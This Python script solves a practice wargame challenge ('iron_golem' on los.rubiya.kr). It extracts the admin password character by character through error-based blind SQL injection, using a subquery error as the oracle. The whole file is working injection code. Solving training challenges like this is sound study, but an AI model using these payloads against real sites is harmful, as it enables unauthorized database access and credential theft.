import requests

# error based SQL Injection

cookie={'PHPSESSID':''}
url="https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?"

# flag_len
flag_len=0
for i in range(1,50):
  query="pw='||if(id='admin'%26%26length(pw)={},1,(select 1 union select 2))%23".format(i);
  res=requests.get(url+query, cookies=cookie)
  if (res.text.find("Subquery returns")<0):
    flag_len=i
    break

print("flag_len:{}".format(flag_len))


# flag
flag=""
for i in range(1,flag_len+1):
  for j in range(33,128):
    query="pw='||if(id='admin'%26%26ascii(substr(pw,{},1))={},1,(select 1 union select 2))%23".format(i,j)
    res=requests.get(url+query, cookies=cookie)
    if (res.text.find("Subquery returns")<0):
      flag+=chr(j)
      print(flag)
      break

print("flag:{}".format(flag))
